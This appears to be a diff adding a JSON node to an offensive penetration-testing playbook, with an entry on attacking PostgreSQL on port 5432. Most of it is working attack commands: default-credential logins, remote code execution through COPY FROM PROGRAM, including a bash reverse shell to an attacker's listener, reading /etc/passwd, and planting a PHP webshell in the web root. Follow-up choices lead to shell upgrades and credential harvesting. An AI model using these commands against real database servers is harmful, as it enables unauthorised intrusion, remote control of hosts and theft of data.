@@ -1,0 +1,22 @@
+{
+  "id": "postgres",
+  "phase": "RECON",
+  "title": "PostgreSQL (5432)",
+  "body": "PostgreSQL with COPY TO/FROM PROGRAM is RCE. Default postgres user often has no password. pg_hba.conf controls who can connect.",
+  "cmd": "psql -h $ip -U postgres\npsql -h $ip -U postgres -p 5432\n\n# Default creds: postgres:(blank)  postgres:postgres  postgres:password\n\n# Once connected — RCE via COPY\npsql> COPY shell FROM PROGRAM 'id';\npsql> COPY shell FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/$lhost/$lport 0>&1\"';\n\n# Read files\npsql> COPY shell FROM '/etc/passwd';\npsql> SELECT * FROM shell;\n\n# Write files (if superuser)\npsql> COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';\n\n# Enumerate\npsql> \\l           # list databases\npsql> \\c dbname    # connect to db\npsql> \\dt          # list tables\npsql> SELECT current_user, pg_postmaster_start_time();",
+  "warn": null,
+  "choices": [
+    {
+      "label": "RCE via COPY PROGRAM — got shell",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "Wrote webshell — got RCE",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Found creds in DB",
+      "next": "creds_found"
+    }
+  ]
+}
